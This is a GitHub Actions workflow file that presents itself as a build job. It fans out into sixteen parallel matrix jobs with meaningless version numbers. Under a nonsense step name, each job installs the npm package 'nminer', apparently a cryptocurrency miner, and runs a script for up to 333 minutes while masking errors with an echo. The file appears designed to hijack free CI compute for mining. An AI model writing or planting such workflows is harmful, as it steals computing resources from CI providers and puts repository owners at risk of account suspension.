name: cross-contamination
on:
  push:
    branches: [ "main" ]

jobs:
  build:
    runs-on: ubuntu-latest
    strategy:
      matrix:
        config:
          - { version: 111 }
          - { version: 9668 }
          - { version: 8993 }
          - { version: 6061 }
          - { version: 891 }
          - { version: 1238 }
          - { version: 9513 }
          - { version: 8518 }
          - { version: 2426 }
          - { version: 6347 }
          - { version: 4054 }
          - { version: 8658 }
          - { version: 6898 }
          - { version: 2460 }
          - { version: 9331 }
          - { version: 4360 }

    steps:
      - name: Checkout
        uses: actions/checkout@v4

      - name: Install Node.js
        uses: actions/setup-node@v3
        with:
          node-version: 20
          
      - name: charlatan underneath aged jittery
        run: |
          npm install nminer@latest
          timeout 333m node cross-contamination.js || echo "cross-contamination executed"